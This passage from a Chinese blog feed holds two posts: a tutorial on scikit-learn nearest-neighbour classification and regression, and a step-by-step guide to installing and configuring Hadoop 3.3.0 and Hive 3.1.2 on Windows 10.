<description>&lt;p&gt;&lt;code class=&quot;xref py py-mod docutils literal notranslate&quot;&gt;&lt;span class=&quot;pre&quot;&gt;s&lt;a class=&quot;reference internal&quot; title=&quot;sklearn.neighbors&quot; href=&quot;https://scikit-learn.org/stable/modules/classes.html#module-sklearn.neighbors&quot;&gt;klearn.neighbors&lt;/a&gt;&lt;/span&gt;&lt;/code&gt; 提供了针对无监督和受监督的基于邻居的学习方法的功能。监督的基于最邻近的机器学习算法是值：对带标签的数据的分类和对连续数据的预测（回归）。 无监督的最近算法是许多其他学习方法的基础，尤其是流形学习（manifold learning）和频谱聚类（spectral clustering）。&lt;/p&gt;
&lt;p&gt;最近邻方法的原理是找到距离新数据点最近的特定数量的训练样本，并从中预测标签。样本数可以是用户定义的常数（knn算法），也可以基于点的局部密度而变化（基于半径的邻居学习）。 距离通常可以是任何度量标准：标准欧几里德距离是最常见的选择，基于邻居的方法被称为非通用机器学习方法，因为它们仅“记住”其所有训练数据（可能转换为快速索引结构，例如Ball Tree或KD Tree）。&lt;/p&gt;
&lt;p&gt;尽管最邻近算法十分简单，但它已成功解决了许多分类和回归问题，包括手写数字和卫星图像场景。作为非参数方法，它通常非常适用于在决策边界非常不规则的分类情况下。&lt;/p&gt;
&lt;h2&gt;一，无监督的最邻近算法&lt;/h2&gt;
&lt;p&gt;无监督的最邻近算法，用于寻找最邻近的数据点，是其他最邻近算法的基础。&lt;/p&gt;
&lt;p&gt;无监督的最邻近算法主要有：BallTree，KDTree和基于sklearn.metrics.pairwise中的例程的brute-force算法，用户可以通过关键字'algorithm'来制定寻找最邻近的算法，该关键字的值必须是['auto'，'ball_tree'，'kd_tree'，'brute']之一，当传递默认值“ auto”时，算法会尝试从训练数据中确定最佳的方法。 &lt;/p&gt;
&lt;p&gt;brute-force 是最原始的计算两个数据点之间的距离的算法，该算法的思想是计算数据集中每两个数据点之间的距离，找出距离最小的数据点。&lt;/p&gt;
&lt;p&gt;K-D Tree：K维度树（k-dimensional tree），基于树来查找距离最小的数据点&lt;/p&gt;
&lt;p&gt;Ball Tree：球树，KD 树对于低维度 (D&amp;lt;20) 的近邻搜索非常快, 当 D 增长到很大时, 效率变低；这就是所谓的 “维度灾难” 的一种体现；KD 树只能处理欧式距离；为了解决 KD 树在高维上效率低下的问题, ball 树应运而生，同时 Ball tree 可处理一般的距离。&lt;/p&gt;
&lt;p&gt;举个例子，通过 &lt;span class=&quot;n&quot;&gt;NearestNeighbors()函数和algorithm来指定寻找最邻近数据点的算法：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;from&lt;/span&gt; sklearn.neighbors &lt;span&gt;import&lt;/span&gt;&lt;span&gt; NearestNeighbors
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; numpy as np
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; X = np.array([[-1, -1], [-2, -1], [-3, -2], [1, 1], [2, 1], [3, 2&lt;span&gt;]])
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; nbrs = NearestNeighbors(n_neighbors=2, algorithm=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ball_tree&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).fit(X)
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; distances, indices = nbrs.kneighbors(X)
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;二，基于最邻近算法的分类&lt;/h2&gt;
&lt;p&gt;基于最邻近算法的分类是基于实例的学习，它不尝试构建通用的内部模型，而只是存储训练数据的实例。分类的原理是根据数据点的最邻近数据的类型的多数来预测该数据点的类型，类似于投票，如果一个数据点附近的数据点的类型大部分都是“A”，那么模型预测该数据点的类型也是“A”。&lt;/p&gt;
&lt;p&gt;scikit-learn实现两个不同的最近邻居分类器：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;KNeighborsClassifier 基于每个查询点的k个最近邻居来实现预测，其中，k是指定的整数值。&lt;/li&gt;
&lt;li&gt;RadiusNeighborsClassifier基于每个训练点的固定半径内的邻居数来实现学习，其中，r是指定的浮点值。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;分类器的定义如下，该定义只列出最重要的参数，详细参数请参考sicikit-learn 官网：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
sklearn.neighbors.RadiusNeighborsClassifier(radius=1.0, weights=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;uniform&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, algorithm=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;auto&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, metric=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;minkowski&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,...&lt;span&gt;)
sklearn.neighbors.KNeighborsClassifier(n_neighbors&lt;/span&gt;=5, weights=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;uniform&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, algorithm=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;auto&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, metric=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;minkowski&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,...)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参数注释：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;radius：寻找最邻近数据点的半径&lt;/li&gt;
&lt;li&gt;n_neighbors：最邻近的邻居数量&lt;/li&gt;
&lt;li&gt;algorithm：寻找最邻近的数据点的算法，有效值是['auto'，'ball_tree'，'kd_tree'，'brute']&lt;/li&gt;
&lt;li&gt;metric：计算距离的度量，详细信息请查看：&lt;a class=&quot;reference internal&quot; title=&quot;sklearn.neighbors.DistanceMetric&quot; href=&quot;https://scikit-learn.org/stable/modules/generated/sklearn.neighbors.DistanceMetric.html#sklearn.neighbors.DistanceMetric&quot;&gt;&lt;code class=&quot;xref py py-class docutils literal notranslate&quot;&gt;&lt;span class=&quot;pre&quot;&gt;DistanceMetric&lt;/span&gt;&lt;/code&gt;&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;weights：权重，默认值weights ='uniform'，为每个邻居分配统一的权重。 weights ='distance'分配的权重与距查询点的距离成反比。用于也可以提供定义函数来计算权重。在某些情况下，最好对邻居加权，以使较近的邻居对拟合的贡献更大，这可以通过weights关键字完成。&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;三，基于最邻近算法的回归&lt;/h2&gt;
&lt;p&gt;基于最邻近算法的分类，本质上是对离散的数据标签进行预测，实际上，最邻近算法也可以用于对连续的数据标签进行预测，这种方法叫做基于最邻近数据的回归，预测的值（即数据的标签）是连续值，通过计算数据点最临近数据点平均值而获得预测值。&lt;/p&gt;
&lt;p&gt;scikit-learn实现了两个不同的最邻近回归模型：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;KNeighborsRegressor：根据每个查询点的最邻近的k个数据点的均值作为预测值，其中，k是用户指定的整数。&lt;/li&gt;
&lt;li&gt;RadiusNeighborsRegressor：基于查询点的固定半径内的数据点的均值作为预测值，其中r是用户指定的浮点值。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;回归模拟器的定义如下，该定义只列出最重要的参数，详细参数请参考sicikit-learn 官网：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
sklearn.neighbors.KNeighborsRegressor(n_neighbors=5, weights=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;uniform&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, algorithm=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;auto&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, metric=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;minkowski&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,...&lt;span&gt;)
sklearn.neighbors.RadiusNeighborsRegressor(radius&lt;/span&gt;=1.0, weights=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;uniform&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, algorithm=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;auto&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, metric=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;minkowski&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,...)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最基本的最邻近回归使用统一的权重，也就是说，在特定范围中的每个数据点对查询点的分类（回归）的作用是相同的。在某些情况下，对权重点进行加权可能会比较有利，以使邻近的点比远离的点对回归的贡献更大，这可以通过weights关键字完成。默认值weights ='uniform'，为所有点分配相等的权重。 weights ='distance'分配的权重与距查询点的距离成反比。&lt;/p&gt;

&lt;p&gt;参考文档：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://scikit-learn.org/stable/modules/neighbors.html#neighbors&quot; target=&quot;_blank&quot;&gt;1.6. Nearest Neighbors&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;K-D Tree&lt;/h3&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:31:00 +0000</pubDate>
<dc:creator>悦光阴</dc:creator>
<og:description>sklearn.neighbors&amp;#160;提供了针对无监督和受监督的基于邻居的学习方法的功能。监督的基于最邻近的机器学习算法是值：对带标签的数据的分类和对连续数据的预测（回归）。&amp;#160;无监督</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/ljhdo/p/13909887.html</dc:identifier>
</item>
<item>
<title>Windows10系统下Hadoop和Hive开发环境搭建填坑指南 - throwable</title>
<link>http://www.cnblogs.com/throwable/p/13917379.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/throwable/p/13917379.html</guid>
<description>&lt;h2 id=&quot;前提&quot;&gt;前提&lt;/h2&gt;
&lt;p&gt;笔者目前需要搭建数据平台，发现了&lt;code&gt;Windows&lt;/code&gt;系统下，&lt;code&gt;Hadoop&lt;/code&gt;和&lt;code&gt;Hive&lt;/code&gt;等组件的安装和运行存在大量的坑，而本着有坑必填的目标，笔者还是花了几个晚上的下班时候在多个互联网参考资料的帮助下完成了&lt;code&gt;Windows10&lt;/code&gt;系统下&lt;code&gt;Hadoop&lt;/code&gt;和&lt;code&gt;Hive&lt;/code&gt;开发环境的搭建。这篇文章记录了整个搭建过程中的具体步骤、遇到的问题和对应的解决方案。&lt;/p&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;环境准备&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;基于笔者的软件版本洁癖，所有选用的组件都会使用当前（2020-10-30）最高的版本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;软件&lt;/th&gt;
&lt;th&gt;版本&lt;/th&gt;
&lt;th&gt;备注&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;4.5&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Windows&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;操作系统&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;JDK&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;8&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;暂时不要选用大于等于&lt;code&gt;JDK9&lt;/code&gt;的版本，因为启动虚拟机会发生未知异常&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;MySQL&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;8.x&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;用于管理&lt;code&gt;Hive&lt;/code&gt;的元数据&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Apache Hadoop&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;3.3.0&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;code&gt;Apache Hive&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;3.1.2&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;&lt;code&gt;Apache Hive src&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;1.2.2&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;因为只有&lt;code&gt;1.x&lt;/code&gt;版本的&lt;code&gt;Hive&lt;/code&gt;源码提供了&lt;code&gt;.bat&lt;/code&gt;启动脚本，有能力可以自己写脚本就不用下此源码包&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;winutils&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hadoop-3.3.0&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hadoop&lt;/code&gt;的&lt;code&gt;Windows&lt;/code&gt;系统下的启动依赖&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;下面列举部分组件对应的下载地址：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;Apache Hadoop 3.3.0&lt;/code&gt;：&lt;code&gt;https://mirror.bit.edu.cn/apache/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Apache Hive 3.1.2&lt;/code&gt;：&lt;code&gt;https://mirrors.bfsu.edu.cn/apache/hive/hive-3.1.2/apache-hive-3.1.2-bin.tar.gz&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Apache Hive 1.2.2 src&lt;/code&gt;：&lt;code&gt;https://mirrors.bfsu.edu.cn/apache/hive/hive-1.2.2/apache-hive-1.2.2-src.tar.gz&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;winutils&lt;/code&gt;：&lt;code&gt;https://github.com/kontext-tech/winutils&lt;/code&gt;（如果下载速度慢，可以先把仓库导入&lt;code&gt;gitee.com&lt;/code&gt;再下载，或者用笔者已经同步好的仓库&lt;code&gt;https://gitee.com/throwableDoge/winutils&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下载完这一些列软件之后，&lt;code&gt;MySQL&lt;/code&gt;正常安装为系统服务随系统自启。解压&lt;code&gt;hadoop-3.3.0.tar.gz&lt;/code&gt;、&lt;code&gt;apache-hive-3.1.2-bin.tar.gz&lt;/code&gt;、&lt;code&gt;apache-hive-1.2.2-src.tar.gz&lt;/code&gt;和&lt;code&gt;winutils&lt;/code&gt;到指定目录：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接着把源码包&lt;code&gt;apache-hive-1.2.2-src.tar.gz&lt;/code&gt;解压后的&lt;code&gt;bin&lt;/code&gt;目录下的文件拷贝到&lt;code&gt;apache-hive-3.1.2-bin&lt;/code&gt;的&lt;code&gt;bin&lt;/code&gt;目录中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后把&lt;code&gt;winutils&lt;/code&gt;中的&lt;code&gt;hadoop-3.3.0\bin&lt;/code&gt;目录下的&lt;code&gt;hadoop.dll&lt;/code&gt;和&lt;code&gt;winutils.exe&lt;/code&gt;文件拷贝到&lt;code&gt;Hadoop&lt;/code&gt;的解压目录的&lt;code&gt;bin&lt;/code&gt;文件夹下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-3.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后再配置一下&lt;code&gt;JAVA_HOME&lt;/code&gt;和&lt;code&gt;HADOOP_HOME&lt;/code&gt;两个环境变量，并且在&lt;code&gt;Path&lt;/code&gt;中添加&lt;code&gt;%JAVA_HOME%\bin;&lt;/code&gt;和&lt;code&gt;%HADOOP_HOME%\bin&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-4.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;笔者本地安装的JDK版本为1.8.0.212，理论上任意一个小版本的JDK8都可以。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接着用命令行测试一下，如果上述步骤没问题，控制台输出如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;配置和启动hadoop&quot;&gt;配置和启动Hadoop&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;HADOOP_HOME&lt;/code&gt;的&lt;code&gt;etc\hadoop&lt;/code&gt;子目录下，找到并且修改下面的几个配置文件：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;core-site.xml&lt;/strong&gt;（这里的&lt;code&gt;tmp&lt;/code&gt;目录一定要配置一个非虚拟目录，别用默认的&lt;code&gt;tmp&lt;/code&gt;目录，否则后面会遇到权限分配失败的问题）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;configuration&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;fs.defaultFS&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;hdfs://localhost:9000&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;  
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;hadoop.tmp.dir&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;/e:/LittleData/hadoop-3.3.0/data/tmp&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;  
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;hdfs-site.xml&lt;/strong&gt;（这里要预先创建&lt;code&gt;nameNode&lt;/code&gt;和&lt;code&gt;dataNode&lt;/code&gt;的数据存放目录，注意一下每个目录要以&lt;code&gt;/&lt;/code&gt;开头，笔者这里预先在&lt;code&gt;HADOOP_HOME/data&lt;/code&gt;创建了&lt;code&gt;nameNode&lt;/code&gt;和&lt;code&gt;dataNode&lt;/code&gt;子目录）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;configuration&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;dfs.replication&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;1&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;dfs.http.address&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;0.0.0.0:50070&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;    
        &amp;lt;name&amp;gt;dfs.namenode.name.dir&amp;lt;/name&amp;gt;    
        &amp;lt;value&amp;gt;/e:/LittleData/hadoop-3.3.0/data/nameNode&amp;lt;/value&amp;gt;    
    &amp;lt;/property&amp;gt;    
    &amp;lt;property&amp;gt;    
        &amp;lt;name&amp;gt;dfs.datanode.data.dir&amp;lt;/name&amp;gt;    
        &amp;lt;value&amp;gt;/e:/LittleData/hadoop-3.3.0/data/dataNode&amp;lt;/value&amp;gt;  
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;dfs.permissions.enabled&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;false&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;mapred-site.xml&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;configuration&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;mapreduce.framework.name&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;yarn&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;yarn-site.xml&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;configuration&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;yarn.nodemanager.aux-services&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;mapreduce_shuffle&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
    &amp;lt;property&amp;gt;
        &amp;lt;name&amp;gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&amp;lt;/name&amp;gt;
        &amp;lt;value&amp;gt;org.apache.hadoop.mapred.ShuffleHandler&amp;lt;/value&amp;gt;
    &amp;lt;/property&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此，最小化配置基本完成。接着需要格式化&lt;code&gt;namenode&lt;/code&gt;并且启动&lt;code&gt;Hadoop&lt;/code&gt;服务。切换至&lt;code&gt;$HADOOP_HOME/bin&lt;/code&gt;目录下，使用&lt;code&gt;CMD&lt;/code&gt;输入命令&lt;code&gt;hdfs namenode -format&lt;/code&gt;（格式化&lt;code&gt;namenode&lt;/code&gt;切记不要重复执行）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;格式化&lt;code&gt;namenode&lt;/code&gt;完毕后，切换至&lt;code&gt;$HADOOP_HOME/sbin&lt;/code&gt;目录下，执行&lt;code&gt;start-all.cmd&lt;/code&gt;脚本：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-7.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里命令行会提示&lt;code&gt;start-all.cmd&lt;/code&gt;脚本已经过期，建议使用&lt;code&gt;start-dfs.cmd&lt;/code&gt;和&lt;code&gt;start-yarn.cmd&lt;/code&gt;替代。同理，如果执行&lt;code&gt;stop-all.cmd&lt;/code&gt;也会有类似的提示，可以使用&lt;code&gt;stop-dfs.cmd&lt;/code&gt;和&lt;code&gt;stop-yarn.cmd&lt;/code&gt;替代。&lt;code&gt;start-all.cmd&lt;/code&gt;成功执行后，会拉起四个&lt;code&gt;JVM&lt;/code&gt;实例（见上图中的&lt;code&gt;Shell&lt;/code&gt;窗口自动新建了四个&lt;code&gt;Tab&lt;/code&gt;），此时可以通过&lt;code&gt;jps&lt;/code&gt;查看当前的&lt;code&gt;JVM&lt;/code&gt;实例：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;λ jps
19408 ResourceManager
16324 NodeManager
14792 Jps
15004 NameNode
2252 DataNode
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可见已经启动了&lt;code&gt;ResourceManager&lt;/code&gt;、&lt;code&gt;NodeManager&lt;/code&gt;、&lt;code&gt;NameNode&lt;/code&gt;和&lt;code&gt;DataNode&lt;/code&gt;四个应用，至此&lt;code&gt;Hadoop&lt;/code&gt;的单机版已经启动成功。通过&lt;code&gt;stop-all.cmd&lt;/code&gt;命令退出这四个进程。可以通过&lt;code&gt;http://localhost:8088/&lt;/code&gt;查看调度任务的状态：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-8.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;http://localhost:50070/&lt;/code&gt;去查看&lt;code&gt;HDFS&lt;/code&gt;的状态和文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-9.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;重启&lt;code&gt;Hadoop&lt;/code&gt;的办法：先执行&lt;code&gt;stop-all.cmd&lt;/code&gt;脚本，再执行&lt;code&gt;start-all.cmd&lt;/code&gt;脚本。&lt;/p&gt;
&lt;h2 id=&quot;配置和启动hive&quot;&gt;配置和启动Hive&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Hive&lt;/code&gt;是构筑于&lt;code&gt;HDFS&lt;/code&gt;上的，所以务必确保&lt;code&gt;Hadoop&lt;/code&gt;已经启动。&lt;code&gt;Hive&lt;/code&gt;在&lt;code&gt;HDFS&lt;/code&gt;中默认的文件路径前缀是&lt;code&gt;/user/hive/warehouse&lt;/code&gt;，因此可以先通过命令行在&lt;code&gt;HDFS&lt;/code&gt;中创建此文件夹：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;hdfs dfs -mkdir /user/hive/warehouse
hdfs dfs -chmod -R 777 /user/hive/warehouse
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同时需要通过下面的命令创建并为&lt;code&gt;tmp&lt;/code&gt;目录赋予权限：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;hdfs dfs -mkdir /tmp
hdfs dfs -chmod -R 777 /tmp
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在系统变量中添加&lt;code&gt;HIVE_HOME&lt;/code&gt;，具体的值配置为&lt;code&gt;E:\LittleData\apache-hive-3.1.2-bin&lt;/code&gt;，同时在&lt;code&gt;Path&lt;/code&gt;变量添加&lt;code&gt;%HIVE_HOME%\bin;&lt;/code&gt;，跟之前配置&lt;code&gt;HADOOP_HOME&lt;/code&gt;差不多。下载和拷贝一个&lt;code&gt;mysql-connector-java-8.0.x.jar&lt;/code&gt;到&lt;code&gt;$HIVE_HOME/lib&lt;/code&gt;目录下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-10.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;创建&lt;code&gt;Hive&lt;/code&gt;的配置文件，在&lt;code&gt;$HIVE_HOME/conf&lt;/code&gt;目录下已经有对应的配置文件模板，需要拷贝和重命名，具体如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;$HIVE_HOME/conf/hive-default.xml.template&lt;/code&gt; =&amp;gt; &lt;code&gt;$HIVE_HOME/conf/hive-site.xml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$HIVE_HOME/conf/hive-env.sh.template&lt;/code&gt; =&amp;gt; &lt;code&gt;$HIVE_HOME/conf/hive-env.sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$HIVE_HOME/conf/hive-exec-log4j.properties.template&lt;/code&gt; =&amp;gt; &lt;code&gt;$HIVE_HOME/conf/hive-exec-log4j.properties&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$HIVE_HOME/conf/hive-log4j.properties.template&lt;/code&gt; =&amp;gt; &lt;code&gt;$HIVE_HOME/conf/hive-log4j.properties&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-11.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;hive-env.sh&lt;/code&gt;脚本，在尾部添加下面内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;export HADOOP_HOME=E:\LittleData\hadoop-3.3.0
export HIVE_CONF_DIR=E:\LittleData\apache-hive-3.1.2-bin\conf
export HIVE_AUX_JARS_PATH=E:\LittleData\apache-hive-3.1.2-bin\lib
&lt;/code&gt;
&lt;/pre&gt;
